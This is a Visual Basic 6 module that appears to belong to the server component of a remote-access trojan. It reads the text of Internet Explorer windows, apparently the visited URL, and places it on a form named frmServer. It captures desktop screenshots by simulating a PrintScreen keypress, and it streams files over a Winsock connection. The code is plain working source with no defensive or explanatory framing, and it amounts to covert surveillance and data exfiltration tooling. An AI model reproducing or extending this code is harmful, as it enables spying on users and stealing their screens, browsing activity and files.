Attribute VB_Name = "modFiles"
Public Function EditInfo(window_hwnd As Long) As String
Dim txt As String
Dim buf As String
Dim buflen As Long
Dim child_hwnd As Long
Dim children() As Long
Dim num_children As Integer
Dim i As Integer
buflen = 256
buf = Space$(buflen - 1)
buflen = GetClassName(window_hwnd, buf, buflen)
buf = Left$(buf, buflen)
If buf = "Edit" Then
    EditInfo = WindowText(window_hwnd)
    Exit Function
End If
num_children = 0
child_hwnd = GetWindow(window_hwnd, GW_CHILD)
Do While child_hwnd <> 0
    num_children = num_children + 1
    ReDim Preserve children(1 To num_children)
    children(num_children) = child_hwnd
    child_hwnd = GetWindow(child_hwnd, GW_HWNDNEXT)
Loop
For i = 1 To num_children
    txt = EditInfo(children(i))
    If txt <> "" Then Exit For
Next i
EditInfo = txt
End Function
Public Function WindowText(window_hwnd As Long) As String
Dim txtlen As Long
Dim txt As String
WindowText = ""
If window_hwnd = 0 Then Exit Function
txtlen = SendMessage(window_hwnd, WM_GETTEXTLENGTH, 0, 0)
If txtlen = 0 Then Exit Function
txtlen = txtlen + 1
txt = Space$(txtlen)
txtlen = SendMessage(window_hwnd, WM_GETTEXT, txtlen, ByVal txt)
WindowText = Left$(txt, txtlen)
End Function
Public Function EnumProc(ByVal app_hwnd As Long, ByVal lParam As Long) As Boolean
Dim buf As String * 1024
Dim title As String
Dim length As Long
length = GetWindowText(app_hwnd, buf, Len(buf))
title = Left$(buf, length)
If Right$(title, 30) = " - Microsoft Internet Explorer" Then
    frmServer.Label1 = EditInfo(app_hwnd)
    EnumProc = 0
Else
    EnumProc = 1
End If
End Function
Public Function GetDesktopPrint(ByVal theFile As String) As Boolean
Clipboard.Clear
Dim lString As String
DoEvents: DoEvents
Call keybd_event(vbKeySnapshot, 1, 0, 0)
DoEvents: DoEvents
SavePicture Clipboard.GetData(vbCFBitmap), theFile
GetDesktopPrint = True
Exit Function
End Function
Public Sub SendFile(FileName As String, WinS As Winsock)
Dim FreeF As Integer
Dim LenFile As Long
Dim nCnt As Long
Dim LocData As String
Dim LoopTimes As Long
Dim i As Long
FreeF = FreeFile
Open FileName For Binary As #99
    nCnt = 1
    LenFile = LOF(99)
    WinS.SendData "|FILESIZE|" & LenFile
    DoEvents
    Sleep (400)
    Do Until nCnt >= (LenFile)
        LocData = Space$(1024)
        Get #99, nCnt, LocData
        If nCnt + 1024 > LenFile Then
            WinS.SendData Mid$(LocData, 1, (LenFile - nCnt))
        Else
            WinS.SendData LocData
        End If
        nCnt = nCnt + 1024
    Loop
Close #99
End Sub
